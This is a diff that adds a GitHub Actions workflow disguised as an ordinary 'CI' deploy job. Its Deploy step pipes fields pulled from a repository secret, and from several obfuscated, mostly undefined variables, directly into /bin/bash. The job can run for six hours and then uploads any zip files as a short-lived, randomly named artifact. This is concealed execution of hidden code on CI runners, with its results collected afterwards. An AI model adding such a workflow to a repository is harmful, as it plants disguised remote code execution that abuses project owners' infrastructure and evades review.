@@ -1,0 +1,29 @@
+name: CI
+on:
+  workflow_dispatch:
+
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          err1833: ${{ secrets.err1833 }}
+        run: |
+          printf '%s' "$err1833" | jq -r .i4 | /bin/bash
+          echo $lnbnf4 | jq -r .gs35301 | /bin/bash
+          echo $hebiv1573 | jq -r .wh7 | /bin/bash
+          echo $mh9532 | jq -r .ordh820 | /bin/bash
+          echo $ttqy0754 | jq -r .k5165 | /bin/bash
+          echo $t4930 | jq -r .p16 | /bin/bash
+          printf '%s' "$jgf0391" | jq -r .c37 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZZcp79X5
+          path: "*.zip"
+          retention-days: 1
